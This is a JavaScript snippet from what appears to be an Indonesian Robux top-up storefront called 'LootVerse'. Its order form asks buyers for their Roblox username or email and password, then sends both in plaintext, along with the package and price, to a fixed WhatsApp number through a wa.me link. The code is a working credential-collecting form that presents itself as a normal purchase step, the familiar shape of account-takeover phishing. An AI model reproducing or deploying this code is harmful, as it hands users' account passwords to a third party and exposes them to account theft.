let prod='',harga='';function openOrder(p,h){prod=p;harga=h;info.innerHTML='<b>'+p+'</b><br>'+h;popup.style.display='flex';}
function closePop(){popup.style.display='none';}
function sendOrder(){if(!user.value||!pass.value){alert('Isi username dan password');return;}
let msg=`Halo Admin LootVerse! 👋

Saya ingin Top Up Robux Via Login.

👤 Username/Email : ${user.value}
🔒 Password : ${pass.value}
💎 Paket : ${prod}
💰 Harga : ${harga}
💳 Pembayaran : ${pay.value}`;
window.open('https://wa.me/6289674970911?text='+encodeURIComponent(msg),'_blank');}